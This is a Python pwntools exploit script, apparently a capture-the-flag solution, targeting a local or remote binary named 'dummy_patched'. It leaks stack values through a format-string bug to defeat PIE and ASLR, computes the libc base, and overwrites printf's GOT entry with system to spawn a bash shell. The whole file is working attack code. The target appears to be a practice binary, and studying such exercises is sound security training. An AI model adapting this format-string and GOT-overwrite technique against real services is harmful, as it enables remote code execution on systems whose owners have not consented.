from pwn import *
from warnings import filterwarnings
import re

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+791
continue
'''.format(**locals())

exe = './dummy_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
filterwarnings("ignore")

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

io = start()
libc = ELF("libc.so.6")

# ===========================================================
#                   Leak ELF Section & LIBC
# ===========================================================

io.sendline('2')
leak = "%23$p.%45$p"
io.sendline(f"Leak={leak}")
io.recvuntil(f"Leak=")
leak = io.recvline()
addresses = re.findall(rb"0x[0-9a-zA-Z]+" , leak)
pie = int(addresses[0], 16)
lib = int(addresses[1], 16)
elf.address = pie - (0x55a990b93350 - 0x000055a990b90000)
libc.address = lib - (0x7fa432629d90-0x00007fa432600000)
log.info("leak Base Address: %#x", lib)

log.info("ELF Base Address: %#x", elf.address)
log.info("LIBC Base Address: %#x", libc.address)

# ===========================================================
#                   GOT Overwrite
# ===========================================================

io.recvuntil('(y/n):')
io.sendline('y')
system = libc.sym['system']
printf = elf.got['printf']
offset = 6

log.info("System Address: %#x", system)

write = {printf: system}
payload = fmtstr_payload(offset, write)
io.sendline(payload)

io.recvuntil('(y/n):')
io.sendline('y')
io.recvuntil('Shoot:')
io.sendline('bash')

io.interactive()
